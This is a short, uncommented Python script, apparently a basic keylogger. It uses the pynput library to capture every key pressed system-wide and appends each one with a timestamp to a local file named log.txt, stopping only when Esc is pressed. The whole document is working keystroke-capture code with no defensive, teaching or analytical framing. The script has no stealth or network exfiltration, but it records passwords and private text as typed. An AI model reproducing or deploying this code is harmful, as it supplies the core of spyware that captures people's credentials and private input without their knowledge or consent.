from pynput.keyboard import Key, Listener
from datetime import datetime

def on_press(key):
    with open("log.txt", "a") as log_file:
        time_stamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        try:
            log_file.write(f"{time_stamp} - {key.char}\n")
        except AttributeError:
            log_file.write(f"{time_stamp} - {key}\n")

def on_release(key):
    if key == Key.esc:
        return False

with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()


